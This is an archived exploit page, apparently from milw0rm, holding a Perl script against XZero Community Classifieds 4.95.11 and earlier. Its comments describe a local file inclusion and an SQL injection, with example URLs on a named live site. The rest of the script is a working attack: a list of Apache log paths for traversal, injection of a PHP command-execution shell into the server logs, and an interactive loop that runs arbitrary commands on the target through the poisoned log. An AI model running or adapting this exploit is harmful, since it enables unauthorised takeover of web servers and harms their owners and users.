<html><head><title>XZero Community Classifieds <= 4.95.11 LFI / SQL Injection</title></head><pre>#!/usr/bin/perl
#
# XZero Community Classifieds  &lt;= v4.95.11 LFI &amp; SQL Injection
# linK : http://www.xzeroscripts.com
# download: http://rapidshare.com/files/66809648/XZCl4.95.11.rar
# original thread: http://en.rstzone.org/xzero-community-classifieds-v4-95-11-lfi-sql-in-t9394.rst
# (c)od3d and f0unded by Kw3rLn from Romanian Security Team a.K.A http://rstzone.org
#
# Local file inclusion in index.php:
#
#  switch($xview)
#        {
#                      [ ..... ]
#            case &quot;page&quot;            : $page = &quot;$_GET[pagename].php&quot;;    break;
#               [ ..... ]
#        }
#
#  include_once($page);
# in common.inc.php line 40: $xview = $_GET['view'] ? $_GET['view'] : &quot;main&quot;;
#
# SQL Injection in post.php
# line 511: $sql = &quot;SELECT expireafter FROM $t_subcats WHERE subcatid = $_REQUEST[subcatid]&quot;;
# ( And more but useless cuz admin password is in config.inc.php)
#
# LFI: http://site.com/index.php?view=page&amp;pagename=[Local_FIle]%00
# Example: http://www.diasporaromana.com/index.php?view=page&amp;pagename=tetete
#
# SQL: http://site.com/index.php?view=post&amp;cityid=2&amp;lang=en&amp;catid=2&amp;subcatid=[SQL]
# Example: http://www.diasporaromana.com/index.php?view=post&amp;cityid=220&amp;lang=en&amp;catid=5&amp;subcatid=18'
#
# And now exploit for LFI

use IO::Socket;
use LWP::Simple;


@apache=(
&quot;../../../../../var/log/httpd/access_log&quot;,
&quot;../../../../../var/log/httpd/error_log&quot;,
&quot;../apache/logs/error.log&quot;,
&quot;../apache/logs/access.log&quot;,
&quot;../../apache/logs/error.log&quot;,
&quot;../../apache/logs/access.log&quot;,
&quot;../../../apache/logs/error.log&quot;,
&quot;../../../apache/logs/access.log&quot;,
&quot;../../../../apache/logs/error.log&quot;,
&quot;../../../../apache/logs/access.log&quot;,
&quot;../../../../../apache/logs/error.log&quot;,
&quot;../../../../../apache/logs/access.log&quot;,
&quot;../logs/error.log&quot;,
&quot;../logs/access.log&quot;,
&quot;../../logs/error.log&quot;,
&quot;../../logs/access.log&quot;,
&quot;../../../logs/error.log&quot;,
&quot;../../../logs/access.log&quot;,
&quot;../../../../logs/error.log&quot;,
&quot;../../../../logs/access.log&quot;,
&quot;../../../../../logs/error.log&quot;,
&quot;../../../../../logs/access.log&quot;,
&quot;../../../../../etc/httpd/logs/access_log&quot;,
&quot;../../../../../etc/httpd/logs/access.log&quot;,
&quot;../../../../../etc/httpd/logs/error_log&quot;,
&quot;../../../../../etc/httpd/logs/error.log&quot;,
&quot;../../.. /../../var/www/logs/access_log&quot;,
&quot;../../../../../var/www/logs/access.log&quot;,
&quot;../../../../../usr/local/apache/logs/access_log&quot;,
&quot;../../../../../usr/local/apache/logs/access.log&quot;,
&quot;../../../../../var/log/apache/access_log&quot;,
&quot;../../../../../var/log/apache/access.log&quot;,
&quot;../../../../../var/log/access_log&quot;,
&quot;../../../../../var/www/logs/error_log&quot;,
&quot;../../../../../var/www/logs/error.log&quot;,
&quot;../../../../../usr/local/apache/logs/error_log&quot;,
&quot;../../../../../usr/local/apache/logs/error.log&quot;,
&quot;../../../../../var/log/apache/error_log&quot;,
&quot;../../../../../var/log/apache/error.log&quot;,
&quot;../../../../../var/log/ access_log&quot;,
&quot;../../../../../var/log/error_log&quot;
);

print &quot;[RST] XZero Community Classifieds &lt;= v4.95.11 Remote Command Execution Exploit\n&quot;;
print &quot;[RST] need magic_quotes_gpc = off\n&quot;;
print &quot;[RST] c0ded by Kw3rLN from Romanian Security Team [ http://rstzone.org ] \n\n&quot;;


if (@ARGV &lt; 3)
{
    print &quot;[RST] Usage: xzero.pl [host] [path] [apache_path]\n\n&quot;;
    print &quot;[RST] Apache Path: \n&quot;;
    $i = 0;
    while($apache[$i])
    { print &quot;[$i] $apache[$i]\n&quot;;$i++;}
    exit();
}

$host=$ARGV[0];
$path=$ARGV[1];
$apachepath=$ARGV[2];

print &quot;[RST] Injecting some code in log files...\n&quot;;
$CODE=&quot;&lt;?php ob_clean();system(\$HTTP_COOKIE_VARS[cmd]);die;?&gt;&quot;;
$socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$host&quot;, PeerPort=&gt;&quot;80&quot;) or die &quot;[RST] Could not connect to host.\n\n&quot;;
print $socket &quot;GET &quot;.$path.$CODE.&quot; HTTP/1.1\r\n&quot;;
print $socket &quot;User-Agent: &quot;.$CODE.&quot;\r\n&quot;;
print $socket &quot;Host: &quot;.$host.&quot;\r\n&quot;;
print $socket &quot;Connection: close\r\n\r\n&quot;;
close($socket);
print &quot;[RST] Shell!! write q to exit !\n&quot;;
print &quot;[RST] IF not working try another apache path\n\n&quot;;

print &quot;[shell] &quot;;$cmd = &lt;STDIN&gt;;

while($cmd !~ &quot;q&quot;) {
    $socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$host&quot;, PeerPort=&gt;&quot;80&quot;) or die &quot;[RST] Could not connect to host.\n\n&quot;;

    print $socket &quot;GET &quot;.$path.&quot;index.php?view=page&amp;pagename=&quot;.$apache[$apachepath].&quot;%00&amp;cmd=$cmd HTTP/1.1\r\n&quot;;
    print $socket &quot;Host: &quot;.$host.&quot;\r\n&quot;;
    print $socket &quot;Accept: */*\r\n&quot;;
    print $socket &quot;Connection: close\r\n\n&quot;;

    while ($raspuns = &lt;$socket&gt;)
    {
        print $raspuns;
    }
    print &quot;[shell] &quot;;
    $cmd = &lt;STDIN&gt;;
}

# milw0rm.com [2007-12-26]</pre></html>